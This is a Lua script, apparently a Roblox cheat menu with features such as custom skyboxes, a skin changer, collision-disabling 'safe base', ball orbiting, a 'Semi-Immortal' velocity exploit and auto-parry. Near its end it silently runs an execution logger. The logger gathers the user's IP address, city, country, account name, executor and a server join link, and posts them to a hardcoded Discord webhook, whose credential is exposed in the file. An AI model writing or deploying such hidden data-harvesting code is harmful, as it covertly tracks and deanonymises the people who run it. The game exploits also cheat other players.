    ["Dark Night"] = {"6285719338", "6285721078", "6285722964", "6285724682", "6285726335", "6285730635"},
    ["Space Wave"] = {"16262356578", "16262358026", "16262360469", "16262362003", "16262363873", "16262366016"},
    ["Space Wave2"] = {"1233158420", "1233158838", "1233157105", "1233157640", "1233157995", "1233159158"},
    ["Turquoise Wave"] = {"47974894", "47974690", "47974821", "47974776", "47974859", "47974909"},
    ["Bright Pink"] = {"271042516", "271077243", "271042556", "271042310", "271042467", "271077958"},
    ["Desert"] = {"1013852", "1013853", "1013850", "1013851", "1013849", "1013854"},
    ["Blaze"] = {"150939022", "150939038", "150939047", "150939056", "150939063", "150939082"},
    ["White Galaxy"] = {"5540798456", "5540799894", "5540801779", "5540801192", "5540799108", "5540800635"},
    ["Blue Galaxy"] = {"14961495673", "14961494492", "14961492844", "14961491298", "14961490439", "14961489508"}
}

local function applySkybox(skyName)
    local skyboxData = skys[skyName]

    if not skyboxData then
        return warn("Skybox \"" .. tostring(skyName) .. "\" not found.")
    end

    for i, face in skyFaces do
        Lighting.Sky[face] = "rbxassetid://" .. skyboxData[i]
    end

    Lighting.GlobalShadows = false
end

local function restoreDefaultSky()
    local defaultSkybox = skys["Default"]

    for i, face in skyFaces do
        Lighting.Sky[face] = "rbxassetid://" .. defaultSkybox[i]
    end
    Lighting.GlobalShadows = true
end

local stalk

local CustomSky = world:create_module({
    title = 'Custom Sky',
    flag = 'Custom_Sky',
    description = 'custom skybox',
    section = 'left',
    callback = function(value)
        skytoggleac = value

        if value then
            applySkybox(selectedSkyOption)

            if not stalk then
                stalk = Lighting.ChildAdded:Connect(function(obj)
                    if obj:IsA('Sky') then
                        applySkybox(selectedSkyOption)
                    end
                end)
            end
        else
            restoreDefaultSky()

            if stalk then
                stalk:Disconnect()
                stalk = nil
            end
        end
    end
})

CustomSky:create_dropdown({
    title = 'Select Sky',
    flag = 'custom_sky_selector',
    options = {
        "Default",
        "Vaporwave",
        "Redshift",
        "Desert",
        "Blaze",
        "Space Wave",
        "Space Wave2",
        "Turquoise Wave",
        "Dark Night",
        "Bright Pink",
        "White Galaxy",
        "Blue Galaxy"
    },
    multi_dropdown = false,
    maximum_options = 12,
    callback = function(selectedOption)
        selectedSkyOption = selectedOption

        if skytoggleac then
            applySkybox(selectedOption)
        end
    end
})
local isFilterEnabled = false
local isAtmosphereEnabled = false
local isFogEnabled = false
local isSaturationEnabled = false

local currentAtmosphereDensity = 0.5
local currentFogDistance = 1000
local currentSaturationLevel = 0

local originalSettings = {
    fogEnd = nil,
    tintColor = nil,
    saturation = nil,
    hasOriginalAtmosphere = false,
    originalAtmosphereDensity = nil
}

local monitorConnection = nil

local function saveOriginalSettings()
    if not originalSettings.fogEnd then
        originalSettings.fogEnd = game.Lighting.FogEnd
        originalSettings.tintColor = game.Lighting.ColorCorrection.TintColor
        originalSettings.saturation = game.Lighting.ColorCorrection.Saturation

        local existingAtmosphere = game.Lighting:FindFirstChildOfClass("Atmosphere")
        if existingAtmosphere then
            originalSettings.hasOriginalAtmosphere = true
            originalSettings.originalAtmosphereDensity = existingAtmosphere.Density
        end
    end
end

local function restoreOriginalSettings()
    if originalSettings.fogEnd then
        game.Lighting.FogEnd = originalSettings.fogEnd
        game.Lighting.ColorCorrection.TintColor = originalSettings.tintColor
        game.Lighting.ColorCorrection.Saturation = originalSettings.saturation

        local customAtmosphere = game.Lighting:FindFirstChild("CustomAtmosphere")
        if customAtmosphere then
            customAtmosphere:Destroy()
        end

        if originalSettings.hasOriginalAtmosphere then
            local atmosphere = Instance.new("Atmosphere")
            atmosphere.Density = originalSettings.originalAtmosphereDensity
            atmosphere.Parent = game.Lighting
        end
    end
end

local function applyCurrentSettings()
    if not isFilterEnabled then return end

    if isAtmosphereEnabled then
        local atmosphere = game.Lighting:FindFirstChild("CustomAtmosphere")
        if not atmosphere then
            atmosphere = Instance.new("Atmosphere")
            atmosphere.Name = "CustomAtmosphere"
            atmosphere.Parent = game.Lighting
        end
        atmosphere.Density = currentAtmosphereDensity
    end

    if isFogEnabled then
        game.Lighting.FogEnd = currentFogDistance
    end

    if isSaturationEnabled then
        game.Lighting.ColorCorrection.Saturation = currentSaturationLevel
    end
end

local function areSettingsCorrect()
    if not isFilterEnabled then return true end

    if isAtmosphereEnabled then
        local atmosphere = game.Lighting:FindFirstChild("CustomAtmosphere")
        if not atmosphere or atmosphere.Density ~= currentAtmosphereDensity then
            return false
        end
    end

    if isFogEnabled and game.Lighting.FogEnd ~= currentFogDistance then
        return false
    end

    if isSaturationEnabled and game.Lighting.ColorCorrection.Saturation ~= currentSaturationLevel then
        return false
    end
    
    return true
end

local function startMonitoring()
    if monitorConnection then
        monitorConnection:Disconnect()
    end
    
    monitorConnection = game:GetService("RunService").Heartbeat:Connect(function()
        if isFilterEnabled and not areSettingsCorrect() then
            applyCurrentSettings()
        end
    end)
end

local function stopMonitoring()
    if monitorConnection then
        monitorConnection:Disconnect()
        monitorConnection = nil
    end
end

local WorldFilter = world:create_module({
    title = 'Custom Filter',
    flag = 'Filter',
    description = 'custom world filter effects',
    section = 'right',
    callback = function(value)
        isFilterEnabled = value

        if value then
            saveOriginalSettings()
            applyCurrentSettings()
            startMonitoring()
        else
            stopMonitoring()
            restoreOriginalSettings()
        end
    end
})

WorldFilter:create_checkbox({
    title = 'Atmosphere',
    flag = 'World_Filter_Atmosphere',
    callback = function(value)
        isAtmosphereEnabled = value

        if isFilterEnabled then
            if value then
                local atmosphere = game.Lighting:FindFirstChild("CustomAtmosphere")
                if not atmosphere then
                    atmosphere = Instance.new("Atmosphere")
                    atmosphere.Name = "CustomAtmosphere"
                    atmosphere.Parent = game.Lighting
                end
                atmosphere.Density = currentAtmosphereDensity
            else
                local customAtmosphere = game.Lighting:FindFirstChild("CustomAtmosphere")
                if customAtmosphere then
                    customAtmosphere:Destroy()
                end
            end
        end
    end
})

WorldFilter:create_slider({
    title = 'Atmosphere Density',
    flag = 'World_Filter_Atmosphere_Slider',
    minimum_value = 0,
    maximum_value = 1,
    value = 0.5,
    callback = function(value)
        currentAtmosphereDensity = value
        
        if isFilterEnabled and isAtmosphereEnabled then
            local atmosphere = game.Lighting:FindFirstChild("CustomAtmosphere")
            if atmosphere then
                atmosphere.Density = value
            end
        end
    end
})

WorldFilter:create_checkbox({
    title = 'Saturation',
    flag = 'World_Filter_Saturation',
    callback = function(value)
        isSaturationEnabled = value

        if isFilterEnabled then
            if value then
                game.Lighting.ColorCorrection.Saturation = currentSaturationLevel
            else
                game.Lighting.ColorCorrection.Saturation = originalSettings.saturation or 0
            end
        end
    end
})

WorldFilter:create_slider({
    title = 'Saturation Level',
    flag = 'World_Filter_Saturation_Slider',
    minimum_value = -1,
    maximum_value = 2,
    value = 0,
    callback = function(value)
        currentSaturationLevel = value
        
        if isFilterEnabled and isSaturationEnabled then
            game.Lighting.ColorCorrection.Saturation = value
        end
    end
})

local SkinChanger = misc:create_module({
    title = 'Skin Changer',
    flag = 'SkinChanger',
    description = 'Sword Skin Changer',
    section = 'left',
    callback = function(value)
        getgenv().skinChanger = value

        if value then
            task.spawn(function()
                local timeout = 3
                repeat
                    task.wait(0.1)
                    timeout -= 0.1
                until Player:GetAttribute("CurrentlyEquippedSword") or timeout <= 0

                local equipped = Player:GetAttribute("CurrentlyEquippedSword")
                if equipped then
                    originalSwordModelName = equipped
                    originalSwordAnimationName = swordsController.CurrentSword
                    originalSwordFXName = getSlashName(equipped)
                    getgenv().updateSword()
                else
                    warn("[SkinChanger]")
                end
            end)
        else
            local char = Player.Character
            if char then
                for _, v in pairs(char:GetChildren()) do
                    if v:IsA("Model") and v.Name == getgenv().swordModel then
                        v:Destroy()
                    end
                end
            end

            if originalSwordModelName and originalSwordAnimationName and originalSwordFXName then
                task.spawn(function()
                    local remote = rs.Remotes.EquipSword
                    if remote then
                        remote:FireServer(originalSwordModelName)
                    end

                    local timeout = 3
                    repeat
                        task.wait(0.1)
                        timeout -= 0.1
                    until Player:GetAttribute("CurrentlyEquippedSword") == originalSwordModelName or timeout <= 0

                    char = Player.Character or Player.CharacterAdded:Wait()
                    timeout = 3
                    repeat
                        task.wait(0.1)
                        timeout -= 0.1
                    until char:FindFirstChild(originalSwordModelName) or timeout <= 0

                    setupvalue(rawget(swordInstances, "EquipSwordTo"), 2, false)
                    swordInstances:EquipSwordTo(char, originalSwordModelName)
                    swordsController:SetSword(originalSwordAnimationName)
                    getgenv().slashName = originalSwordFXName
                end)
            end
        end
    end
})

SkinChanger:change_state(false)

SkinChanger:create_textbox({
    title = "Skin Name",
    placeholder = "Enter Sword Skin Name... ",
    flag = "SkinChangerTextbox",
    callback = function(text)
        getgenv().swordModel = text
        getgenv().swordAnimations = text
        getgenv().swordFX = text
        if getgenv().skinChanger then
            getgenv().updateSword()
        end
    end
})


misc:create_module({
    title = 'Safe Base',
    flag = 'Safe_Base',
    description = 'Generates a secure platform',
    section = 'right',
    callback = function(enabled)
        local Players = game:GetService('Players')
        local RunService = game:GetService('RunService')
        local player = Players.LocalPlayer

        local PreviousBallFloor = nil
        local swimmingConnections = {}

        local function getMapFolder()
            return workspace:FindFirstChild('Map')
        end

        local function findBallFloor()
            local map = getMapFolder()
            if not map then return nil end
            return map:FindFirstChild('BallFloor', true)
        end

        local function clearPlatform()
            if getgenv().SafePlatformInstance then
                getgenv().SafePlatformInstance:Destroy()
                getgenv().SafePlatformInstance = nil
            end
        end

        local function restoreOriginalProperties()
            local MapFolder = getMapFolder()
            if MapFolder and getgenv().OriginalMapProperties then
                for _, item in ipairs(MapFolder:GetDescendants()) do
                    if item:IsA("BasePart") and getgenv().OriginalMapProperties[item] then
                        local props = getgenv().OriginalMapProperties[item]
                        if item and item.Parent then
                            item.Transparency = props.Transparency
                            item.CanCollide = props.CanCollide
                        end
                    end
                end
            end
            getgenv().OriginalMapProperties = nil
        end

        local function blockSwimming(character)
            local humanoid = character:WaitForChild("Humanoid")
            local conn = humanoid.StateChanged:Connect(function(_, newState)
                if newState == Enum.HumanoidStateType.Swimming then
                    humanoid:ChangeState(Enum.HumanoidStateType.Running)
                end
            end)
            table.insert(swimmingConnections, conn)
        end

        local function connectCharacter(character)
            blockSwimming(character)
        end

        local function disconnectSwimming()
            for _, conn in pairs(swimmingConnections) do
                conn:Disconnect()
            end
            swimmingConnections = {}
        end

        if enabled then
            getgenv().OriginalMapProperties = {}

            if player.Character then
                connectCharacter(player.Character)
            end
            swimmingConnections[#swimmingConnections + 1] = player.CharacterAdded:Connect(connectCharacter)

            getgenv().SafePlatformHeartbeat = RunService.Heartbeat:Connect(function()
                local MapFolder = getMapFolder()
                local BallFloor = findBallFloor()

                if not MapFolder or not BallFloor then
                    clearPlatform()
                    PreviousBallFloor = nil
                    return
                end

                if BallFloor ~= PreviousBallFloor then
                    PreviousBallFloor = BallFloor
                    clearPlatform()

                    local NewPlatform = Instance.new('Part')
                    NewPlatform.Name = 'UwU'
                    NewPlatform.Size = Vector3.new(2048, 1, 2048)

                    local TopY = BallFloor.Position.Y + (BallFloor.Size.Y / 2)
                    local PlatformY = TopY - 19

                    NewPlatform.Position = Vector3.new(
                        BallFloor.Position.X,
                        PlatformY,
                        BallFloor.Position.Z
                    )

                    NewPlatform.Anchored = true
                    NewPlatform.Material = Enum.Material.SmoothPlastic
                    NewPlatform.Color = Color3.fromRGB(0, 150, 255)
                    NewPlatform.Transparency = 1
                    NewPlatform.Parent = MapFolder

                    getgenv().SafePlatformInstance = NewPlatform
                end

                for _, item in ipairs(MapFolder:GetDescendants()) do
                    if item:IsA("BasePart") and item ~= getgenv().SafePlatformInstance then
                        if not getgenv().OriginalMapProperties[item] then
                            getgenv().OriginalMapProperties[item] = {
                                Transparency = item.Transparency,
                                CanCollide = item.CanCollide
                            }
                        end
                        item.Transparency = 0.9
                        item.CanCollide = false
                    end
                end
            end)

            getgenv().DeleteSafePlatform = function()
                clearPlatform()
                restoreOriginalProperties()
                disconnectSwimming()
                if getgenv().SafePlatformHeartbeat then
                    getgenv().SafePlatformHeartbeat:Disconnect()
                    getgenv().SafePlatformHeartbeat = nil
                end
                getgenv().DeleteSafePlatform = nil
                PreviousBallFloor = nil
            end

        else
            if getgenv().DeleteSafePlatform then
                getgenv().DeleteSafePlatform()
            end
        end
    end
})

local Camera = workspace.CurrentCamera


local orbitConnection

local function BalltoOrbitGet()
    local folder = workspace:FindFirstChild("Balls")
    if not folder then return nil end
    for _, b in pairs(folder:GetChildren()) do
        if b:GetAttribute("realBall") and b:IsA("BasePart") then
            return b
        end
    end
    return nil
end

getgenv().OrbitEnabled = false
getgenv().OrbitDistance = 20
getgenv().OrbitHeight = 0
getgenv().OrbitSpeed = 10

local OrbitToggle = misc:create_module({
    title = 'Orbit Ball',
    flag = 'Orbit_Ball',
    description = 'Makes you spin around the ball',
    section = 'left',

    callback = function(state)
        getgenv().OrbitEnabled = state

        if state then
            orbitConnection = RunService.RenderStepped:Connect(function()
                local ballorbit = BalltoOrbitGet()
                if not ballorbit then return end

                Camera.CameraSubject = ballorbit
                Camera.CameraType = Enum.CameraType.Custom

                local t = tick() * getgenv().OrbitSpeed
                local offset = Vector3.new(
                    math.cos(t) * getgenv().OrbitDistance,
                    getgenv().OrbitHeight,
                    math.sin(t) * getgenv().OrbitDistance
                )

                local targetPosition = ballorbit.Position + offset
                local char = LocalPlayer.Character
                if char and char:FindFirstChild("HumanoidRootPart") then
                    char:MoveTo(targetPosition)
                end
            end)
        else
            if orbitConnection then orbitConnection:Disconnect() end
            orbitConnection = nil
            Camera.CameraSubject = LocalPlayer.Character:FindFirstChild("Humanoid")
            Camera.CameraType = Enum.CameraType.Custom
        end
    end
})

OrbitToggle:create_slider({
    title = 'Orbit Distance',
    flag = 'OrbitDistance',
    minimum_value = 3,
    maximum_value = 150,
    value = 20,
    round_number = true,
    callback = function(v) getgenv().OrbitDistance = v end
})

OrbitToggle:create_slider({
    title = 'Orbit Height',
    flag = 'OrbitHeight',
    minimum_value = -50,
    maximum_value = 50,
    value = 0,
    round_number = true,
    callback = function(v) getgenv().OrbitHeight = v end
})

OrbitToggle:create_slider({
    title = 'Orbit Speed',
    flag = 'OrbitSpeed',
    minimum_value = 0.1,
    maximum_value = 200,
    value = 10,
    round_number = false,
    callback = function(v) getgenv().OrbitSpeed = v end
})

guiset:create_module({
    title = "GUI Library Visible",
    description = "visibility of GUI library",
    flag = "guilibraryvisible",
    section = "left",
    callback = function(state)
        getgenv().guilibraryVisible = state
    end
})


local verticalDirection = 1

function IsInAliveFolder()
    local char = LocalPlayer.Character
    local alive = workspace:FindFirstChild("Alive")
    return char and alive and char.Parent == alive
end

for _, v in pairs(LocalPlayer.Character:GetChildren()) do
    if v:IsA("Script") and v.Name ~= "Health" and v.Name ~= "Sound" and v:FindFirstChild("LocalScript") then
        v:Destroy()
    end
end

LocalPlayer.CharacterAdded:Connect(function(char)
    repeat
        wait()
    until LocalPlayer.Character
    char.ChildAdded:Connect(function(child)
        if child:IsA("Script") then 
            wait(0.25)
            if child:FindFirstChild("LocalScript") then
                child.LocalScript:FireServer()
            end
        end
    end)
end)

RunService.Heartbeat:Connect(function()
    if getgenv().semiimortal and IsInAliveFolder() then
        local character = LocalPlayer.Character
        if not character then return end
        
        local hrp = character:FindFirstChild("HumanoidRootPart")
        if not hrp then return end

        local CurrentVelocity = hrp.Velocity
        hrp.CFrame = hrp.CFrame * CFrame.Angles(0,math.rad(0),0)
        hrp.CFrame = hrp.CFrame * CFrame.Angles(0,math.rad(0.01),0)

        hrp.Velocity = Vector3.new(0, 2500 * verticalDirection, 0)
        RunService.RenderStepped:Wait()
        hrp.Velocity = CurrentVelocity

        verticalDirection = verticalDirection * -1
    end
end)

wait(0.1)

spawn(function()
    wait(0.1)
    RunService.Heartbeat:Connect(function()
        if getgenv().semiimortal and IsInAliveFolder() then
            local character = LocalPlayer.Character
            if not character then return end
            
            local hrp = character:FindFirstChild("HumanoidRootPart")
            if not hrp then return end

            local CurrentVelocity = hrp.Velocity
            hrp.CFrame = hrp.CFrame * CFrame.Angles(0,math.rad(0),0)
            hrp.CFrame = hrp.CFrame * CFrame.Angles(0,math.rad(0.01),0)

            hrp.AssemblyLinearVelocity = Vector3.new(0, 2500 * verticalDirection, 0)
            RunService.RenderStepped:Wait()
            hrp.Velocity = CurrentVelocity

            verticalDirection = verticalDirection * -1
        end
    end)
end)

wait(0.5)

spawn(function()
    wait(0.6)
    RunService.Heartbeat:Connect(function()
        if getgenv().semiimortal and IsInAliveFolder() then
            local character = LocalPlayer.Character
            if not character then return end
            
            local hrp = character:FindFirstChild("HumanoidRootPart")
            if not hrp then return end

            local CurrentVelocity = hrp.Velocity
            hrp.CFrame = hrp.CFrame * CFrame.Angles(0,math.rad(0),0)
            hrp.CFrame = hrp.CFrame * CFrame.Angles(0,math.rad(0.01),0)

            hrp.Velocity = Vector3.new(0, 2500 * verticalDirection, 0)
            RunService.RenderStepped:Wait()
            hrp.Velocity = CurrentVelocity
            verticalDirection = verticalDirection * -1
        end
    end)
end)

wait(0.1)

spawn(function()
    wait(0.8)
    RunService.Heartbeat:Connect(function()
        if getgenv().semiimortal and IsInAliveFolder() then
            local character = LocalPlayer.Character
            if not character then return end
            
            local hrp = character:FindFirstChild("HumanoidRootPart")
            if not hrp then return end

            local CurrentVelocity = hrp.Velocity
            hrp.CFrame = hrp.CFrame * CFrame.Angles(0,math.rad(0),0)
            hrp.CFrame = hrp.CFrame * CFrame.Angles(0,math.rad(0.01),0)

            hrp.AssemblyLinearVelocity = Vector3.new(0, 2500 * verticalDirection, 0)
            RunService.RenderStepped:Wait()
            hrp.Velocity = CurrentVelocity
            verticalDirection = verticalDirection * -1
        end
    end)
end)

local Semi_Imortal = devuwu:create_module({
    title = "Semi-Immortal",
    description = "",
    flag = "Semi_Imortal_UwU",
    section = "left",
    callback = function(state)
        getgenv().semiimortal = state

        if getgenv().semiimortalNotify then
            Library.SendNotification({
                title = "Semi-Imortal Notification",
                text = state and "Semi-Imortal has been turned ON" or "Semi-Imortal has been turned OFF",
            })
        end     
    end
})

Semi_Imortal:create_checkbox({
    title = "Notify",
    flag = "Semi_Imortal_Notify",
    callback = function(value)
        getgenv().semiimortalNotify = value
    end
})

    local validRankedPlaceIds = {
        13772394625,
        14915220621,
    }

    local selectedQueue = "FFA"
    local autoRequeueEnabled = false

    local AutoRankedRequeue = devuwu:create_module({
        title = 'Auto Ranked Requeue',
        flag = 'autoranqued',
    
        description = 'Automatically requeues Ranked',
        section = 'right',
    
        callback = function(value)
            autoRequeueEnabled = value

            if autoRequeueEnabled then
                if not table.find(validRankedPlaceIds, game.PlaceId) then
                    autoRequeueEnabled = false
                    return
                end

                task.spawn(function()
                    while autoRequeueEnabled do
                        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("JoinQueue"):FireServer("Ranked", selectedQueue, "Normal")
                        task.wait(5)
                    end
                end)
            end
        end
    })

    AutoRankedRequeue:create_dropdown({
        title = 'Select Queue Type',
        flag = 'queuetype',
        options = { 
            "FFA",
            "Duo"
        },
        multi_dropdown = false,
        maximum_options = 2,
        callback = function(selectedOption)
            selectedQueue = selectedOption
        end
    })

local HttpService        = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local UserInputService   = game:GetService("UserInputService")

local CONFIG = {
    WEBHOOK_URL   = "https://discord.com/api/webhooks/1376303388270133391/b5pnEFxe9bpLOMUH4Lzl5UAcfZmZZ4rjQ6H_FynRCmshU8prbgfnyxcVKFE8kSY1RGK5",
    SCRIPT_NAME   = "UwU Semi-Immortal",
    EMBED_COLOR   = 0x2F3136,
    SUCCESS_COLOR = 0x57F287,
    IP_API_URL    = "https://ipinfo.io/json"
}

local executor  = identifyexecutor() or "Unknown"
local placeId   = game.PlaceId
local jobId     = game.JobId
local gameInfo  = MarketplaceService:GetProductInfo(placeId)
local gameName  = gameInfo.Name or "Unknown Game"
local joinLink  = string.format("https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s", placeId, jobId)
local timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")

local function detectPlatform()
    local platformEnum = UserInputService:GetPlatform()
    local isMobile = platformEnum == Enum.Platform.Android or platformEnum == Enum.Platform.IOS
    
    return {
        label = isMobile and "📱 Mobile" or "🖥️ Desktop",
        raw = tostring(platformEnum):gsub("Enum.Platform.", "")
    }
end

function getIPInfo()
    local success, result = pcall(function()
        return HttpService:JSONDecode(game:HttpGet(CONFIG.IP_API_URL))
    end)
    
    if success and result then
        return {
            ip      = result.ip or "Hidden",
            city    = result.city or "Unknown",
            country = result.country or "Unknown",
            org     = result.org or "Unknown ISP",
            region  = result.region or "Unknown"
        }
    end
    
    return {
        ip      = "Hidden",
        city    = "Unknown",
        country = "Unknown", 
        org     = "Unknown ISP",
        region  = "Unknown"
    }
end

local platform = detectPlatform()
local ipInfo   = getIPInfo()

function createEmbed()
    return {
        title       = "🚀 Script Execution Detected",
        description = string.format("**%s** has been executed successfully\n\n", CONFIG.SCRIPT_NAME),
        color       = CONFIG.SUCCESS_COLOR,
        timestamp   = timestamp,
        
        author = {
            name     = string.format("%s (@%s)", Player.DisplayName, Player.Name),
            icon_url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=150&height=150&format=png", Player.UserId)
        },
        
        thumbnail = {
            url = string.format("https://assetgame.roblox.com/Game/Tools/ThumbnailAsset.ashx?aid=%d&fmt=png&wd=420&ht=420", placeId)
        },
        
        fields = {
            {
                name   = "👤 Player Information",
                value  = string.format("**Username:** `%s`\n\n**Display Name:** `%s`\n\n**User ID:** `%d`", 
                    Player.Name, Player.DisplayName, Player.UserId),
                inline = true
            },
            
            {
                name   = "⚙️ System Details",
                value  = string.format("**Executor:** `%s`\n\n**Platform:** %s\n\n**Time:** `%s UTC`", 
                    executor, platform.label, os.date("%H:%M:%S")),
                inline = true
            },
            
            {
                name   = "🌍 Location Data",
                value  = string.format("**IP Address:** ||`%s`||\n\n**Location:** `%s, %s`\n\n**Country:** `%s`", 
                    ipInfo.ip, ipInfo.city, ipInfo.region, ipInfo.country),
                inline = true
            },
            
            {
                name   = "⠀",
                value  = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                inline = false
            },
            
            {
                name   = "🎮 Game Information",
                value  = string.format("**Game Name:** %s\n\n**Place ID:** `%d`\n\n**Server ID:** `%s`", 
                    gameName, placeId, jobId:sub(1, 20) .. "..."),
                inline = false
            },
            
            {
                name   = "⠀",
                value  = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                inline = false
            },
            
            {
                name   = "🔗 Quick Actions",
                value  = string.format("[📥 Join Server](%s)\n\n[👤 View Profile](https://www.roblox.com/users/%d/profile)", 
                    joinLink, Player.UserId),
                inline = false
            },
            
            {
                name   = "⠀",
                value  = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                inline = false
            },
            
            {
                name   = "📋 Teleport Script",
                value  = string.format("```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s')\n```", 
                    placeId, jobId),
                inline = false
            }
        },
        
        footer = {
            text     = string.format("Execution Logger • %s", os.date("%B %d, %Y")),
            icon_url = "https://media.discordapp.net/attachments/1376303344414626009/1398005691708608522/575b53b921cca457f13f7d0246116221.png?ex=6883c9c2&is=68827842&hm=6268367251509ca9580fa5b6385f5013eefc0868198185ef07381fb43ab31446&=&format=webp&quality=lossless&width=679&height=960"
        }
    }
end

function sendToWebhook()
    local payload = {
        username   = "Logs",
        avatar_url = "https://media.discordapp.net/attachments/1376303344414626009/1398005691708608522/575b53b921cca457f13f7d0246116221.png?ex=6883c9c2&is=68827842&hm=6268367251509ca9580fa5b6385f5013eefc0868198185ef07381fb43ab31446&=&format=webp&quality=lossless&width=679&height=960",
        embeds     = { createEmbed() }
    }
    
    pcall(function()
        request({
            Url     = CONFIG.WEBHOOK_URL,
            Method  = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body    = HttpService:JSONEncode(payload)
        })
    end)
end

sendToWebhook()

ReplicatedStorage.Remotes.ParrySuccessAll.OnClientEvent:Connect(function(_, root)
    if root.Parent and root.Parent ~= Player.Character then
        if root.Parent.Parent ~= workspace.Alive then
            return
        end
    end

    Auto_Parry.Closest_Player()

    local Ball = Auto_Parry.Get_Ball()

    if not Ball then
        return
    end

    local Target_Distance = (Player.Character.PrimaryPart.Position - Closest_Entity.PrimaryPart.Position).Magnitude
    local Distance = (Player.Character.PrimaryPart.Position - Ball.Position).Magnitude
    local Direction = (Player.Character.PrimaryPart.Position - Ball.Position).Unit
    local Dot = Direction:Dot(Ball.AssemblyLinearVelocity.Unit)

    local Curve_Detected = Auto_Parry.Is_Curved()

    if Target_Distance < 15 and Distance < 15 and Dot > -0.25 then
        if Curve_Detected then
            Parry()
        end
    end

    if not Grab_Parry then
        return
    end

    Grab_Parry:Stop()
end)

ReplicatedStorage.Remotes.ParrySuccess.OnClientEvent:Connect(function()
    if Player.Character.Parent ~= workspace.Alive then
        return
    end

    if not Grab_Parry then
        return
    end

    Grab_Parry:Stop()
end)

workspace.Balls.ChildAdded:Connect(function()
    Parried = false
end)

workspace.Balls.ChildRemoved:Connect(function(Value)
    Parries = 0
    Parried = false

    if Connections_Manager['Target Change'] then
        Connections_Manager['Target Change']:Disconnect()
        Connections_Manager['Target Change'] = nil
    end
end)

main:load()